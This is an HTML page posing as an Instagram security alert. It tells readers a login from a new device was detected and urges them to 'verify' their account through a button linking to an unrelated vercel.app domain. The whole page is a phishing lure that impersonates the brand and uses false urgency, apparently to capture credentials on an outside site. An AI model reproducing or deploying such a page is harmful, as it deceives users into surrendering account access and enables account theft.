<!DOCTYPE html>
<html>
<head>
    <title>Instagram Security Alert</title>
    <style>
        body { font-family: Arial; background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D); color: white; padding: 50px; }
        .instagram-box { background: rgba(255,255,255,0.1); padding: 40px; border-radius: 15px; max-width: 500px; margin: 0 auto; text-align: center; }
        .btn { background: white; color: #E1306C; padding: 15px 30px; text-decoration: none; border-radius: 25px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="instagram-box">
        <h1>Instagram</h1>
        <h3>Security Alert</h3>
        <p>We detected a login from a new device. Please verify your identity to secure your account.</p>
        
        <a href="http://www.entcu-service.vercel.app/" class="btn">Verify Account</a>
    </div>
</body>
</html>
